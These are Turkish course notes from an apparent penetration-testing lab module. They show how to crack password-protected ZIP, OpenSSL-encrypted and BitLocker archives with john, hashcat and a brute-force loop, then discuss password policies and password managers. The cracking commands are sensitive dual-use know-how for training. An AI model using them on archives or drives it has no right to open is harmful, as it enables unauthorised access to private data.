Soru : Kira kullanıcısının kırılmış şifresini kullanın ve hostta oturum açın ve "id_rsa" SSH anahtarını kırın. Ardından, SSH anahtarının şifresini cevap olarak gönderin.
Cevap :


1- ssh ila kira kullanıcısının makinasına ulaştık . 
2- 

![Pasted image 20241105202519.png](/img/user/resimler/Pasted%20image%2020241105202519.png)

3- 

![Pasted image 20241105202629.png](/img/user/resimler/Pasted%20image%2020241105202629.png)
4-
![Pasted image 20241105202707.png](/img/user/resimler/Pasted%20image%2020241105202707.png)
5-
![Pasted image 20241105202745.png](/img/user/resimler/Pasted%20image%2020241105202745.png)
6-
![Pasted image 20241105202815.png](/img/user/resimler/Pasted%20image%2020241105202815.png)
7-
![Pasted image 20241105202847.png](/img/user/resimler/Pasted%20image%2020241105202847.png)




# Protected Archives
Bağımsız dosyaların yanı sıra, yalnızca bir Office belgesi veya PDF gibi verileri değil, aynı zamanda içlerinde başka dosyaları da içerebilen başka bir dosya biçimi de vardır. Bu biçime `arşiv` veya `sıkıştırılmış dosya` adı verilir ve gerektiğinde bir parola ile korunabilir.  

Bir çalışanın idari bir şirketteki rolünü varsayalım ve müşterimizin analizi Excel, PDF, Word ve ilgili bir sunum gibi farklı formatlarda özetlemek istediğini düşünelim. Bu dosyaları tek tek göndermek bir çözüm olabilir, ancak bu örneği aynı anda birden fazla proje yürüten büyük bir şirkete genişletirsek, bu tür bir dosya aktarımı külfetli hale gelebilir ve tek tek dosyaların kaybolmasına yol açabilir. Bu gibi durumlarda, çalışanlar genellikle gerekli tüm dosyaları projelere göre yapılandırılmış bir şekilde (genellikle alt klasörlerde) bölmelerine, özetlemelerine ve tek bir dosyada paketlemelerine olanak tanıyan arşivlere güvenirler.  

Birçok arşiv dosyası türü vardır. Bazı yaygın dosya uzantıları şunları içerir, ancak bunlarla sınırlı değildir:

![Pasted image 20241105203230.png](/img/user/resimler/Pasted%20image%2020241105203230.png)

Arşiv türlerinin kapsamlı bir listesi [FileInfo.com](https://fileinfo.com/filetypes/compressed) adresinde bulunabilir. Ancak, bunları manuel olarak yazmak yerine, tek bir satır kullanarak da sorgulayabilir, filtreleyebilir ve gerekirse bir dosyaya kaydedebiliriz. Bu yazının yazıldığı sırada fileinfo.com'da listelenen `337`arşiv dosyası türü bulunmaktadır

#### Download All File Extensions
```shell-session
M1R4CKCK@htb[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

.mint
.htmi 
.tpsr
.mpkg  
.arduboy
.ice
.sifz 
.fzpz 
.rar     
.comppkg.hauptwerk.rar
...SNIP...
```

Yukarıdaki arşivlerin hepsinin parola korumasını desteklemediğine dikkat etmek önemlidir. İlgili arşivleri bir parola ile korumak için genellikle başka araçlar kullanılır. Örneğin, `tar` ile arşivleri şifrelemek için `openssl` veya `gpg` aracı kullanılır.


## **Cracking Arşivleri**  

Farklı arşivlerin sayısı ve araçların kombinasyonu göz önüne alındığında, bu bölümde belirli arşivleri kırmanın olası yollarından yalnızca bazılarını göstereceğiz. Parola korumalı arşivler söz konusu olduğunda, genellikle korumalı dosyalardan hash'leri çıkarmamıza ve bunları parolayı kırmak için kullanmamıza izin veren belirli komut dosyalarına ihtiyacımız vardır.  

.zip formatı genellikle Windows ortamlarında birçok dosyayı tek bir dosyada sıkıştırmak için yoğun olarak kullanılır. Daha önce gördüğümüz prosedür, hash'leri çıkarmak için farklı bir script kullanmak dışında aynı kalır.

## Cracking ZIP

#### Using zip2john

```shell-session
M1R4CKCK@htb[/htb]$ zip2john ZIP.zip > zip.hash

ver 2.0 efh 5455 efh 7875 ZIP.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=42, decmplen=30, crc=490E7510
```

Hash'leri çıkararak ZIP arşivinde hangi dosyaların olduğunu da göreceğiz.

#### **zip.hash İçeriğini Görüntüleme**

```shell-session
M1R4CKCK@htb[/htb]$ cat zip.hash 

ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
```

Hash'i çıkardıktan sonra, artık `john'` u kullanarak istediğimiz parola listesiyle kırabiliriz. Çünkü eğer `john` bunu başarıyla kırarsa, bize ZIP arşivini açmak için kullanabileceğimiz ilgili şifreyi gösterecektir.

#### Cracking the Hash with John
```shell-session
M1R4CKCK@htb[/htb]$ john --wordlist=rockyou.txt zip.hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (ZIP.zip/customers.csv)
1g 0:00:00:00 DONE (2022-02-09 09:18) 100.0g/s 250600p/s 250600c/s 250600C/s 123456..1478963
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


#### **Çatlak Hash'i Görüntüleme**

```shell-session
M1R4CKCK@htb[/htb]$ john zip.hash --show

ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip

1 password hash cracked, 0 left
```

## **OpenSSL Şifreli Arşivleri Kırma**  

Ayrıca, bulunan arşivin parola korumalı olup olmadığı, özellikle de parola korumasını desteklemeyen bir dosya uzantısı kullanılıyorsa, her zaman doğrudan belli olmayabilir. Daha önce de tartıştığımız gibi, örnek olarak `gzip` formatını şifrelemek için `openssl` kullanılabilir. Araç `dosyasını` kullanarak , belirtilen dosyanın formatı hakkında bilgi edinebiliriz. Bu, örneğin şu şekilde görünebilir:


#### Listing the Files

```shell-session
M1R4CKCK@htb[/htb]$ ls

GZIP.gzip  rockyou.txt
```


#### Using file

```shell-session
M1R4CKCK@htb[/htb]$ file GZIP.gzip 

GZIP.gzip: openssl enc'd data with salted password
```

OpenSSL şifrelenmiş dosyaları ve arşivleri kırarken, birçok yanlış pozitif getirecek veya hatta doğru şifreyi tahmin edemeyecek birçok farklı zorlukla karşılaşabiliriz. Bu nedenle, başarı için en güvenli seçenek, şifre doğru tahmin edilirse dosyaları doğrudan arşivden çıkarmaya çalışan bir `for-loop` içinde `openssl` aracını kullanmaktır.  

Aşağıdaki tek satır, GZIP formatıyla ilgili birçok hata gösterecektir, bunları görmezden gelebiliriz. Bu örnekte olduğu gibi doğru şifre listesini kullandıysak, arşivden başka bir dosyayı başarıyla çıkardığımızı göreceğiz.


#### **Çıkarılan İçeriği Görüntülemek için for-döngüsü kullanma**

```shell-session
M1R4CKCK@htb[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

<SNIP>
```

for döngüsü bittikten sonra, arşivin kırılmasının başarılı olup olmadığını kontrol etmek için mevcut klasöre tekrar bakabiliriz.


#### **Cracked Arşivinin İçeriğini Listeleme**

```shell-session
M1R4CKCK@htb[/htb]$ ls

customers.csv  GZIP.gzip  rockyou.txt
```

## **BitLocker Şifreli Sürücüleri Kırma**  

[BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-device-encryption-overview-windows-10), tüm bölümler ve harici sürücüler için bir şifreleme programıdır. Microsoft tarafından Windows işletim sistemi için geliştirilmiştir. Windows Vista'dan beri mevcuttur ve 128-bit veya 256-bit uzunluğunda `AES` şifreleme algoritmasını kullanır. BitLocker için parola veya PIN unutulursa, bölümün veya sürücünün şifresini çözmek için kurtarma anahtarını kullanabiliriz. Kurtarma anahtarı, BitLocker kurulumu sırasında oluşturulan ve kaba kuvvetle de zorlanabilen 48 basamaklı bir sayı dizisidir.  

Sanal sürücüler genellikle kişisel bilgilerin, notların ve belgelerin şirket tarafından sağlanan bilgisayarda veya dizüstü bilgisayarda saklandığı ve bu bilgilere üçüncü tarafların erişimini önlemek için oluşturulur. Yine, kırmamız gereken hash'i çıkarmak için `bitlocker2john` adlı bir script kullanabiliriz. Farklı Hashcat hash modları ile kullanılabilecek[dört](https://openwall.info/wiki/john/OpenCL-BitLocker) farklı hash çıkarılacaktır. Örneğimiz için, BitLocker parolasını ifade eden ilkiyle çalışacağız.


#### Using bitlocker2john

```shell-session
M1R4CKCK@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
M1R4CKCK@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
M1R4CKCK@htb[/htb]$ cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b
```

Bu amaç için hem `John` hem de `Hashcat` kullanılabilir. Bu örnekte `Hashcat` ile yapılan işlem incelenecektir. BitLocker hash'lerini kırmak için Hashcat modu `-m 22100`'dür. Bu yüzden Hashcat'e bir hash içeren dosyayı veriyoruz, parola listemizi belirtiyoruz ve hash modunu belirtiyoruz. Bu güçlü bir şifreleme olduğundan (`AES`), kullanılan donanıma bağlı olarak kırma işlemi biraz zaman alabilir. Ek olarak, sonucun saklanacağı dosya adını da belirtebiliriz.


#### **Backup.hash dosyasını kırmak için hashcat kullanma**

```shell-session
M1R4CKCK@htb[/htb]$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked

hashcat (v6.1.1) starting...

<SNIP>

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: BitLocker
Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
Time.Started.....: Wed Feb  9 11:46:40 2022 (1 min, 42 secs)
Time.Estimated...: Wed Feb  9 11:48:22 2022 (0 secs)
Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       28 H/s (8.79ms) @ Accel:32 Loops:4096 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2880/6163 (46.73%)
Rejected.........: 0/2880 (0.00%)
Restore.Point....: 2816/6163 (45.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1044480-1048576
Candidates.#1....: chemical -> secrets

Started: Wed Feb  9 11:46:35 2022
Stopped: Wed Feb  9 11:48:23 2022
```


#### **Cracked Hash'i Görüntüleme**
```shell-session
M1R4CKCK@htb[/htb]$ cat backup.cracked 

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
```

Şifreyi kırdıktan sonra, şifrelenmiş sürücüleri açabileceğiz. BitLocker şifrelenmiş bir sanal sürücüyü bağlamanın en kolay yolu, onu bir Windows sistemine aktarmak ve bağlamaktır. Bunu yapmak için sanal sürücüye çift tıklamamız yeterlidir. Parola korumalı olduğu için Windows bize bir hata gösterecektir. Bağladıktan sonra, BitLocker'a tekrar çift tıklayarak bizden şifreyi isteyebilir.

![Pasted image 20241105211725.png](/img/user/resimler/Pasted%20image%2020241105211725.png)


Soru : 
Cevap : 

1- ssh ile hedefe bağlandık .
2-
![Pasted image 20241105232536.png](/img/user/resimler/Pasted%20image%2020241105232536.png)
3-
![Pasted image 20241105232629.png](/img/user/resimler/Pasted%20image%2020241105232629.png)
4-
![Pasted image 20241105232759.png](/img/user/resimler/Pasted%20image%2020241105232759.png)
5-
![Pasted image 20241105232839.png](/img/user/resimler/Pasted%20image%2020241105232839.png)
6-
![Pasted image 20241105232936.png](/img/user/resimler/Pasted%20image%2020241105232936.png)
7-
![Pasted image 20241105233014.png](/img/user/resimler/Pasted%20image%2020241105233014.png)
8-
![Pasted image 20241105233131.png](/img/user/resimler/Pasted%20image%2020241105233131.png)


# **Password Policies**

Kimlik bilgileri ve şifreleri ele geçirmenin çeşitli yollarını incelediğimize göre, şimdi de şifreler ve kimlik koruması ile ilgili bazı en iyi uygulamaları ele alalım. Hız sınırları ve trafik yasaları güvenli bir şekilde araç kullanabilmemiz için vardır. Bunlar olmadan araba kullanmak kaos olurdu. Aynı şey bir şirketin uygun politikaları olmadığında da olur; herkes sonuçlarına katlanmadan istediğini yapabilir. Bu nedenle hizmet sağlayıcılar ve yöneticiler daha iyi güvenlik için farklı politikalar kullanır ve bunları uygulamak için yöntemler uygular.  

Inlanefreight Corp. için yeni bir çalışan olan Mark ile tanışalım. Mark, BT alanında çalışmıyor ve zayıf bir parolanın riskinin farkında değil. İş e-postası için şifresini belirlemesi gerekiyor. Parolayı `password123` olarak seçer. Ancak, parolanın şirket parola politikasını karşılamadığını belirten bir hata ve parolanın daha güvenli olması için minimum gereksinimi bildiren bir mesaj alır.  

Bu örnekte, iki temel parçamız var: parola politikasının tanımı ve uygulama. Tanım bir kılavuzdur ve uygulama ise kullanıcıların politikaya uymasını sağlamak için kullanılan teknolojidir. Parola ilkesi uygulamasının her iki yönü de çok önemlidir. Bu derste her ikisini de inceleyecek ve etkili bir parola politikasını ve uygulamasını nasıl oluşturabileceğimizi anlayacağız.

## **Password Policy**

[Parola politikası](“https://en.wikipedia.org/wiki/Password_policy”), kullanıcıları güçlü parolalar kullanmaya ve bunları şirketin tanımına uygun şekilde kullanmaya teşvik ederek bilgisayar güvenliğini artırmak için tasarlanmış bir dizi kuraldır. Bir parola politikasının kapsamı parolanın minimum gereksinimleri ile sınırlı olmayıp parolanın tüm yaşam döngüsünü (manipülasyon, depolama ve iletim gibi) kapsar.

## **Password Policy Standards**

Uyumluluk ve en iyi uygulamalar nedeniyle, birçok şirket [BT güvenlik standartlarını](https://en.wikipedia.org/wiki/IT_security_standards) kullanır. Bir standarda uymak %100 güvenli olduğumuz anlamına gelmese de, kuruluşlar için güvenlik kontrollerinin temelini tanımlayan endüstri içinde yaygın bir uygulamadır. Kurumsal güvenlik kontrollerinin etkinliğini ölçmenin tek yolu bu olmamalıdır.  

Bazı güvenlik standartları, parola politikaları veya parola yönergeleri için bir bölüm içerir. İşte en yaygın olanların bir listesi:
1. [NIST SP800-63B](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf)
    
2. [CIS Password Policy Guide](https://www.cisecurity.org/insights/white-papers/cis-password-policy-guide)
    
3. [PCI DSS](https://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dss)

Bu standartları parola politikalarının farklı bakış açılarını anlamak için kullanabiliriz. Bundan sonra, bu bilgileri parola politikamızı oluşturmak için kullanabiliriz. Farklı standartların farklı bir yaklaşım kullandığı bir kullanım durumunu ele alalım, `parola süresinin dolması`.  

`Daha güvenli olmak için parolanızı periyodik olarak (örneğin 90 gün) değiştirin`, birkaç kez duyduğumuz bir ifade olabilir, ancak gerçek şu ki her şirket bu politikayı kullanmıyor. Bazı şirketler, kullanıcılarının şifrelerini yalnızca tehlikeye girdiklerine dair kanıt olduğunda değiştirmelerini istemektedir. Yukarıdaki standartlardan bazılarına bakacak olursak, bazıları kullanıcıların periyodik olarak parola değiştirmesini isterken, diğerleri bunu yapmıyor. Durup düşünmeli, standartları sorgulamalı ve ihtiyaçlarımız için en iyi olanı tanımlamalıyız.

## **Parola Politikası Önerileri**  

Bir parola politikası oluştururken akılda tutulması gereken bazı önemli hususları göstermek için örnek bir parola politikası oluşturalım. Örnek parola politikamız tüm parolaların aşağıdakileri içermesi gerektiğini belirtir:  

- En az 8 karakter.  
- Büyük ve küçük harfler içermelidir.  
- En az bir sayı içermelidir.  
- En az bir özel karakter içermelidir.  
- Kullanıcı adı olmamalıdır.  
- Her 60 günde bir değiştirilmelidir.

`Parola123` ile e-posta oluştururken hata alan yeni çalışanımız Mark, şimdi aşağıdaki parolayı seçiyor `Inlanefreight01!` ve hesabını başarıyla kaydediyor `.` Bu parola şirket politikalarına uygun olsa da, parolanın bir parçası olarak şirket adını kullandığı için güvenli değildir ve kolayca tahmin edilebilir. “Parola Mutasyonları” bölümünde bunun çalışanlar arasında yaygın bir uygulama olduğunu ve saldırganların bunun farkında olduğunu öğrenmiştik.  

Bu parola sona erdiğinde, Mark 01'i 02 olarak değiştirebilir ve parolası şirket parola politikasına uygun olur, ancak parola neredeyse aynıdır. Bu nedenle, güvenlik uzmanları parola süresinin dolması ve bir kullanıcının parolasını ne zaman değiştirmesi gerektiği konusunda açık bir tartışma yürütmektedir.

Bu örneğe dayanarak, şifre politikalarımızın bir parçası olarak, bunlarla sınırlı olmamak üzere, kara listeye alınmış bazı kelimeleri dahil etmeliyiz:

- Şirketin adı  
- Şirketle ilişkilendirilen yaygın kelimeler  
- Ay isimleri  
- Mevsimlerin isimleri  
- Hoş geldiniz kelimesi ve şifre üzerine varyasyonlar  
- Parola, 123456 ve abcde gibi yaygın ve tahmin edilebilir kelimeler

## **Parola Politikasının Uygulanması**  

Parola politikası, kuruluşta parolaları nasıl oluşturmamız, değiştirmemiz ve saklamamız gerektiğini tanımlayan bir kılavuzdur. Bu kılavuzu uygulamak için, elimizdeki teknolojiyi kullanarak veya bu işi yapmak için gerekenleri edinerek onu uygulamamız gerekir. Çoğu uygulama ve kimlik yöneticisi parola politikamızı uygulamak için yöntemler sağlar.  

Örneğin, kimlik doğrulama için Active Directory kullanıyorsak, kullanıcılarımızı parola politikamıza uymaya zorlamak için bir [Active Directory Parola Politikası GPO](https://activedirectorypro.com/how-to-configure-a-domain-password-policy/)'su yapılandırmamız gerekir.  

İşin teknik boyutu halledildikten sonra, politikayı şirkete iletmemiz ve parola politikamızın her yerde uygulanmasını garanti altına almak için süreçler ve prosedürler oluşturmamız gerekir.


## **İyi bir parola oluşturma**  

İyi bir parola oluşturmak kolay olabilir. Parolalarımızın ne kadar güçlü olduğunu test etmemize yardımcı olan bir web sitesi olan [PasswordMonster](https://www.passwordmonster.com/)'ı ve güvenli parolalar oluşturmak için başka bir web sitesi olan [1Password Password Generator](https://1password.com/password-generator/)'ı kullanalım.

![Pasted image 20241105233728.png](/img/user/resimler/Pasted%20image%2020241105233728.png)

`CjDC2x[U` araç tarafından oluşturulan paroladır ve iyi bir paroladır. Kırılması uzun zaman alacaktır ve muhtemelen bir parola püskürtme saldırısında tahmin edilemeyecek veya elde edilemeyecektir, ancak hatırlanması zordur.  

Sıradan kelimeler, ifadeler ve hatta sevdiğimiz şarkılarla iyi parolalar oluşturabiliriz. İşte iyi bir parola örneği `Bu benim güvenli parolam` veya `Köpeğimin adı Poppy`. Bu şifreleri daha karmaşık hale getirmek için özel karakterlerle birleştirebiliriz, örneğin `()Köpeğimin adı Poppy!` Tahmin edilmesi zor olsa da, saldırganların hakkımızda bilgi edinmek için OSINT kullanabileceğini ve parola oluştururken bunu aklımızda tutmamız gerektiğini unutmamalıyız.

![Pasted image 20241105233807.png](/img/user/resimler/Pasted%20image%2020241105233807.png)

Bu yöntemle 3, 4 veya daha fazla parola oluşturabilir ve ezberleyebiliriz, ancak liste arttıkça tüm parolalarımızı hatırlamak zorlaşacaktır. Bir sonraki bölümde, sahip olduğumuz çok sayıda parolayı oluşturmamıza ve korumamıza yardımcı olması için bir Password Manager (Parola Yöneticisi) kullanmayı tartışacağız.

# **Password Managers**

Bugünlerde her şey bir şifre gerektiriyor gibi görünüyor. Evimizdeki Wi-Fi, sosyal ağlar, banka hesapları, iş e-postaları ve hatta favori uygulamalarımız ve web sitelerimiz için şifreler kullanıyoruz. [NordPass araştırmasına](“https://www.techradar.com/news/most-people-have-25-more-passwords-than-at-the-start-of-the-pandemic”) göre, ortalama bir insanın 100 şifresi var, bu da çoğu insanın şifreleri tekrar kullanmasının veya basit şifreler oluşturmasının nedenlerinden biri.  

Tüm bunlar göz önünde bulundurulduğunda, farklı ve güvenli parolalara ihtiyacımız var, ancak herkes bir parolanın güvenli olması için gereken karmaşıklığı karşılayan yüzlerce parolayı ezberleyemez. Şifrelerimizi güvenli bir şekilde düzenlememize yardımcı olabilecek bir şeye ihtiyacımız var. [Parola yöneticisi](“https://en.wikipedia.org/wiki/Password_manager”), kullanıcıların parolalarını ve sırlarını şifrelenmiş bir veritabanında saklamalarını sağlayan bir uygulamadır. Şifrelerimizi ve hassas verilerimizi güvende tutmanın yanı sıra, diğer özelliklerin yanı sıra sağlam ve benzersiz şifreler oluşturma ve yönetme, 2FA, web formlarını doldurma, tarayıcı entegrasyonu, birden fazla cihaz arasında senkronizasyon, güvenlik uyarıları gibi özelliklere de sahiptir.

## **Parola Yöneticisi Nasıl Çalışır?**  

Parola yöneticilerinin uygulanması üreticiye bağlı olarak değişir, ancak çoğu veritabanını şifrelemek için bir master parola ile çalışır.  

Şifreleme ve kimlik doğrulama, şifrelenmiş parola veritabanımıza ve içeriğine yetkisiz erişimi önlemek için farklı [Kriptografik karma işlevleri](https://en.wikipedia.org/wiki/Cryptographic_hash_function) ve [anahtar türetme işlevleri](https://en.wikipedia.org/wiki/Key_derivation_function) kullanarak çalışır. Bunun çalışma şekli üreticiye ve parola yöneticisinin çevrimdışı ya da çevrimiçi olmasına bağlıdır.  

Şimdi yaygın parola yöneticilerini ve nasıl çalıştıklarını inceleyelim.

## **Çevrimiçi Şifre Yöneticileri**  

Bir parola yöneticisine karar verirken en önemli unsurlardan biri kolaylıktır. Tipik bir kişinin 3 veya 4 cihazı vardır ve bunları farklı web sitelerine, uygulamalara vb. giriş yapmak için kullanır. Çevrimiçi bir parola yöneticisi, kullanıcının şifrelenmiş parola veritabanını birden fazla cihaz arasında senkronize etmesine olanak tanır, çoğu bunu sağlar:  

- Bir mobil uygulama.  
    
- Bir tarayıcı eklentisi.  
    
- Bu bölümde daha sonra tartışacağımız diğer bazı özellikler.  
    

Tüm parola yöneticisi sağlayıcıları güvenlik uygulamalarını yönetmek için kendi yöntemlerine sahiptir ve genellikle nasıl çalıştığını açıklayan teknik bir belge sağlarlar. [Bitwarden](“https://bitwarden.com/images/resources/security-white-paper-download.pdf”), [1Password](“https://1passwordstatic.com/files/security/1password-white-paper.pdf”) ve [LastPass](“https://assets.cdngetgo.com/da/ce/d211c1074dea84e06cad6f2c8b8e/lastpass-technical-whitepaper.pdf”) belgelerini referans olarak kontrol edebilirsiniz, ancak daha birçokları da vardır. Bunun genel olarak nasıl çalıştığından bahsedelim.


Çevrimiçi parola yöneticileri için yaygın bir uygulama, master parolaya dayalı anahtarlar türetmektir. Bunun amacı [Zero Knowledge Encryption](https://blog.cubbit.io/blog-posts/what-is-zero-knowledge-encryption) sağlamaktır, yani sizin dışınızda hiç kimse (hizmet sağlayıcı bile) güvenli verilerinize erişemez. Bunu başarmak için, genellikle master şifreyi türetirler. Nasıl çalıştığını açıklamak için Bitwarden'in parola türetme teknik uygulamasını kullanalım:  

1. Master Key: ana şifreyi bir hash'e dönüştürmek için bazı fonksiyonlar tarafından oluşturulur.  
    
2. Master Password Hash: bulutta kimlik doğrulaması yapmak için master şifreyi master anahtar kombinasyonu ile hash'e dönüştürmek için bir fonksiyon tarafından oluşturulur.  
    
3. Şifre Çözme Anahtarı: Kasa öğelerinin şifresini çözmek için Simetrik Anahtar oluşturmak üzere master anahtarı kullanan bir işlev tarafından oluşturulur.


![Pasted image 20241105234119.png](/img/user/resimler/Pasted%20image%2020241105234119.png)

Bu, parola yöneticilerinin nasıl çalıştığını göstermenin basit bir yoludur, ancak yaygın uygulama daha karmaşıktır. Yukarıdaki teknik belgelere bakabilir veya [Parola Yöneticileri Nasıl Çalışır - Computerphile](https://www.youtube.com/watch?v=w68BBPDAWr8) videosunu izleyebilirsiniz.  

En popüler çevrimiçi şifre yöneticileri şunlardır:  

1. [1Şifre](https://1password.com/)  
    
2. [Bitwarden](https://bitwarden.com/)  
    
3. [Dashlane](https://www.dashlane.com/)  
    
4. [Bekçi](https://www.keepersecurity.com/)  
    
5. [Lastpass](https://www.lastpass.com/)  
    
6. [NordPass](https://nordpass.com/)  
    
7. [RoboForm](https://www.roboform.com/)

## **Local Password Managers**  

Bazı şirketler ve bireyler farklı nedenlerle güvenliklerini yönetmeyi ve üçüncü taraflarca sağlanan hizmetlere güvenmemeyi tercih eder. Yerel parola yöneticileri, veritabanını yerel olarak depolayarak ve içeriğini ve depolandığı konumu koruma sorumluluğunu kullanıcıya yükleyerek bu seçeneği sunar. [Dashlane](https://www.dashlane.com/) bir blog yazısı yazdı [Parola Yöneticisi Depolama:](https://blog.dashlane.com/password-storage-cloud-versus-local/) [Bulut](https://blog.dashlane.com/password-storage-cloud-versus-local/) ve[Yerel](https://blog.dashlane.com/password-storage-cloud-versus-local/), her bir depolamanın artılarını ve eksilerini keşfetmenize yardımcı olabilir. Blog yazısında şöyle deniyor: “İlk başta bu durum yerel depolamayı bulut depolamadan daha güvenli hale getiriyor gibi görünebilir, ancak siber güvenlik basit bir disiplin değildir.” Araştırmanıza başlamak ve parolaları yönetmeniz gereken farklı senaryolarda hangi yöntemin daha iyi hizmet vereceğini anlamak için bu blogu kullanabilirsiniz.  

Local parola yöneticileri veritabanı dosyasını bir master anahtar kullanarak şifreler. Master anahtar bir veya birden fazla bileşenden oluşabilir: bir master şifre, bir key dosyası, bir kullanıcı adı, şifre, vb. Genellikle, veritabanına erişmek için master anahtarın tüm parçaları gereklidir.


Local parola yöneticilerinin şifrelemesi bulut uygulamalarına benzer. En belirgin fark veri aktarımı ve kimlik doğrulamadır. Veritabanını şifrelemek için yerel parola yöneticileri farklı kriptografik karma işlevleri (üreticiye bağlı olarak) kullanarak yerel veritabanının güvenliğini sağlamaya odaklanır. Ayrıca anahtarların önceden hesaplanmasını önlemek ve sözlük ve tahmin saldırılarını engellemek için anahtar türetme işlevini (rastgele tuz) kullanırlar. Bazıları Windows Kullanıcı Hesabı Denetimi'ne (UAC) benzer şekilde güvenli bir masaüstü kullanarak bellek koruması ve keylogger koruması sunar.  

En popüler yerel parola yöneticileri şunlardır:  

1. [KeePass](https://keepass.info/)  
    
2. [KWalletManager](https://apps.kde.org/kwalletmanager5/)  
    
3. [Hoş Şifre Sunucusu](https://pleasantpasswords.com/)  
    
4. [Güvenli Şifre](https://pwsafe.org/)


## **Özellikler**  

Linux, Android ve Chrome OS kullandığımızı düşünelim. Tüm uygulamalarımıza ve web sitelerimize herhangi bir cihazdan erişiyoruz. Tüm şifreleri ve güvenli notları tüm cihazlar arasında senkronize etmek istiyoruz. 2FA ile ekstra korumaya ihtiyacımız var ve bütçemiz aylık 1USD. Bu bilgiler bizim için doğru parola yöneticisini belirlememize yardımcı olabilir.  

Bir bulut veya yerel parola yöneticisine karar verirken, özelliklerini anlamamız gerekir, [Wikipedia'](https://en.wikipedia.org/wiki/List_of_password_managers) da parola yöneticilerinin (çevrimiçi ve yerel) bir listesi ve bazı özellikleri vardır. İşte parola yöneticileri için en yaygın özelliklerin bir listesi:  

1. [2FA](https://authy.com/what-is-2fa/) desteği.  
2. Çoklu platform (Android, iOS, Windows, Linux, Mac, vb.).  
3. Tarayıcı Uzantısı.  
4. Giriş Otomatik Tamamlama.  
5. İçe ve dışa aktarma özellikleri.  
6. Parola oluşturma.


## **Alternatifler**  

Parolalar en yaygın kimlik doğrulama yöntemidir ancak tek yöntem değildir. Bu modülde öğrendiğimiz gibi, bir parolayı ele geçirmenin, kırmanın, tahmin etmenin, omuz sörfü yapmanın vb. birçok yolu vardır, peki ya oturum açmak için bir parolaya ihtiyacımız yoksa? Böyle bir şey mümkün mü?  

Varsayılan olarak, çoğu işletim sistemi ve uygulama parola yerine herhangi bir alternatifi desteklemez. Yine de yöneticiler, kuruluşlarında kimlik korumasını yapılandırmak veya geliştirmek için 3. taraf kimlik sağlayıcıları veya uygulamaları kullanabilir. Kimlikleri parolaların ötesinde güvence altına almanın en yaygın yollarından bazıları şunlardır:  

1. [Çok Faktörlü Kimlik Doğrulama](https://en.wikipedia.org/wiki/Multi-factor_authentication).  
2. [FIDO2](https://fidoalliance.org/fido2/) açık kimlik doğrulama standardı, kullanıcıların kolayca kimlik doğrulaması yapmak için [Yubikey](https://www.yubico.com/) gibi yaygın cihazlardan yararlanmasını sağlar. Daha geniş bir cihaz listesi için [Microsoft FIDO2 güvenlik anahtarı sağlayıcılarına](https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-authentication-passwordless#fido2-security-key-providers) bakabilirsiniz.  
3. [Tek Kullanımlık Parola (OTP)](https://en.wikipedia.org/wiki/One-time_password).  
4. [Zaman tabanlı tek seferlik parola (TOTP)](https://en.wikipedia.org/wiki/Time-based_one-time_password).  
5. [IP kısıtlaması](https://news.gandi.net/en/2019/05/using-ip-restriction-to-help-secure-your-account/).  
6. Cihaz Uyumluluğu. Örnekler: [Endpoint Manager](https://www.petervanderwoude.nl/post/tag/device-compliance/) veya [Workspace ONE](https://www.loginconsultants.com/enabling-the-device-compliance-with-workspace-one-uem-authentication-policy-in-workspace-one-access)



### Passwordless
Microsoft, Auth0, Okta, Ping Identity gibi çok sayıda şirket, kimlik doğrulama yöntemi olarak parolayı kaldırmak için Parolasız stratejiyi teşvik etmeye çalışıyor.

